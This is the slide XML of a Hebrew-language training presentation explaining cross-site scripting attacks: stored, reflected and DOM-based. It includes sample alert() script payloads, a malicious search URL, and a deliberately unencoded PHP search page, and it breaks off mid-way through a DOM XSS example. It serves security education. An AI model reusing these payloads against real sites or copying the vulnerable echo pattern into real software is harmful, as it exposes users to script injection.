            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8BF38864-52AB-4C26-B4AD-1D47E428A653}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מהי התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>XSS?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Cross-Site Scripting (XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא סוג של חולשת אבטחת מידע המאפשרת לתוקף להזריק סקריפטים זדוניים לתוך דפי אינטרנט הנצפים על ידי משתמשים אחרים. התקפה זו מתרחשת כאשר אפליקציית אינטרנט אינה מבצעת קידוד או בידוד נכון של קלט מהמשתמשים לפני הצגת הנתונים בדפדפן</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="399904684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F128A72-DA88-45B3-A908-993BCE0BFCA8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5824330" y="642594"/>
            <a:ext cx="5300870" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EA7A1F8F-C6E7-48AC-9EDA-0C930E249F3E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סוגי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ישנם שלושה סוגים עיקריים של התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XSS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Stored XSS (Persistent XSS) .1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התוקף מזריק קוד זדוני לתוך דף האינטרנט המאוחסן בשרת (כגון פוסט בפורום או תגובה בבלוג), והדבר גורם לכך שכל משתמש שיצפה בדף הנגוע יריץ את הקוד הזדוני.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Reflected XSS (Non-Persistent XSS) .2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקוד הזדוני "משתקף" חזרה אל המשתמש כחלק מבקשה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>למשל, קישור זדוני שנשלח במייל, הקוד הזדוני מופעל כאשר המשתמש לוחץ על הקישור.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :DOM-Based XSS .3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפה זו מתרחשת בצד הלקוח כאשר הסקריפט הזדוני משונה או מנצל את מבנה ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM (Document Object Model) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הדף. הקוד זדוני מוזרק באמצעות שינוי ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34422807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B80ABA-DFD0-4836-BE56-AE4FF17B3A75}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6758608" y="642594"/>
            <a:ext cx="4366591" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>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68BC671F-CEF7-40FB-8D29-59B06ADBBC1D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1779104"/>
            <a:ext cx="10058400" cy="4641574"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>Stored XSS (Persistent XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תיאור :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Stored XSS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתרחשת כאשר הקוד הזדוני מוזן לאתר ונשמר בשרת באופן קבוע, למשל כתגובה לפוסט, הודעה בפורום, או תוכן אחר שמשתמשים אחרים יראו. כאשר משתמש אחר גולש לדף המכיל את הקוד הזדוני, הסקריפט מורץ בדפדפן שלו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לנו פורום שמאפשר למשתמשים לפרסם תגובות ללא שום קידוד או בדיקה מקדימה של הקלט. משתמש זדוני יכול להכניס קוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לתגובה שלו, כמו</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt;alert('XSS Attack!');&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאשר משתמשים אחרים יגלשו לדף התגובות, הקוד הזדוני ירוץ בדפדפן שלהם ויציג הודעת התראה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור להמחשה: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בוא נחשוב על פורום פופולרי בשם "פורום יניב". יום אחד, משתמש בשם מיכאל מחליט לשתף תמונה של התחביב שלו, והוא כותב תגובה. משתמש אחר בשם דני מחליט לנצל את ההזדמנות ולשתול קוד זדוני בתגובה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;script&gt;alert(‘Yaniv the king of the world!');&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כל מי שנכנס לדף ורואה את התגובה של דני יקבל התראה עם ההודעה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> “Yaniv the king of the world!" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ההנהלה של "פורום יניב" מבינה מהר מאוד שיש בעיית אבטחה ושהם חייבים לטפל בה כדי להגן על המשתמשים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37611938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50B6B93-9638-43C2-A30C-20747F279676}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6838122" y="254968"/>
            <a:ext cx="4287078" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>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39B5833C-BCEC-402B-9928-AF1053A607BD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1341783"/>
            <a:ext cx="10058400" cy="5367130"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2600" b="1" u="sng" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" u="sng" dirty="0"/>
              <a:t>Reflected XSS (Non-Persistent XSS)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2600" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תיאור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Reflected XS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתרחשת כאשר הקוד הזדוני משתקף חזרה אל המשתמש כחלק מבקשת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> זה קורה בדרך כלל כאשר משתמש מקבל קישור זדוני ולוחץ עליו, מה שמוביל להרצת הקוד הזדוני בדפדפן שלו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לנו אתר חיפוש שמחזיר את התוצאות ללא קידוד נכון:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>(הפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לא עושה קידוד)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;?php</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>isset</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>($_</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>GET</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>['query'])) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>    $query = $_GET['query'];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    echo "You searched for: " . $query;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;form method="GET"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;input type="text" name="query"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;input type="submit" value="Search"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/form&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקף יכול לשלוח קישור זדוני:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="136055004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F57C948-3233-4351-8CCE-C0204BDE4931}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4711148" y="642594"/>
            <a:ext cx="6414052"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F692AED7-24A4-4131-9D2B-3E489BE6A29E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://example.com/search.php?query=&lt;script&gt;alert('XSS Attack!');&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאשר המשתמש ילחץ על הקישור הזה, הקוד הזדוני ירוץ בדפדפן שלו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סיפור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שאביגיל קיבלה מייל מחבר שלה, אורי, עם קישור לאתר שהוא מצא מעניין:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>http://example.com/search.php?query=&lt;script&gt;alert('Hello, Abigail!');&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כאשר אביגיל לוחצת על הקישור, היא רואה הודעת התראה עם ההודעה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> “Hello, Abigail!"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אביגיל מבינה שמישהו ניצל את המערכת של האתר כדי להציג לה הודעה אישית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="10282972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0572A69-F3B9-4D46-A79E-2D040FB20F95}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4760842" y="642594"/>
            <a:ext cx="6364357"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11EA9B66-020E-4853-8BA8-49E01B72B8B4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>DOM-Based XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" u="sng" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" u="sng" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מה זה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הוא מונח שמייצג את הדרך שבה דפי אינטרנט מיוצגים בזיכרון המחשב. זהו מודל אובייקטים שמסביר כיצד רכיבי דף אינטרנט (כגון תגיות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTML, CSS, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ואובייקטים מאורגנים ומתקשרים ביניהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תיאור: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התקפת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> DOM-Based XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מתרחשת בצד הלקוח כאשר הקוד הזדוני משנה את מבנה ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DOM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של הדף או מנצל אותו דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>זה יכול לקרות כאשר קלט מהמשתמש מטופל בצד הלקוח ללא קידוד נכון.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שיש לנו דף </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> HTML</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמטפל בקלט מה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> URL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דרך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JavaScript</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: בשקופית הבאה..</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="12774186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DA252B-952E-44CE-9086-C04536B51B56}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4880113" y="254968"/>
            <a:ext cx="6324600"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BE52757A-8045-4778-9F15-B116817D9FE0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1327868"/>
            <a:ext cx="10058400" cy="5275164"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;!DOCTYPE html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;head&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;title&gt;DOM XSS Example&lt;/title&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;/head&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;div id="output"&gt;&lt;/div&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    &lt;script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        var output = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.getElementById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>('output');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        var </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>urlParams</a:t>
            </a:r>
            <a:r>
